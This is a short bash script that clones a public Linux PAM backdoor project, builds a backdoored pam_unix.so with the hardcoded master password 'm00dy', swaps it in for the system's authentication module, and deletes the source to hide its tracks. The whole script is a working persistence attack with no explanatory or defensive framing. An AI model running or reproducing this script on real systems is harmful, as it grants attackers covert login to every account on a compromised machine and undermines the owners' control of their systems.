#!/bin/bash
apt-get install git -y
git clone https://github.com/zephrax/linux-pam-backdoor.git
cd linux-pam-backdoor/
./backdoor.sh -v 1.1.8 -p m00dy
mv pam_unix.so /lib/x86_64-linux-gnu/security/
rm -rf linux-pam-backdoor/
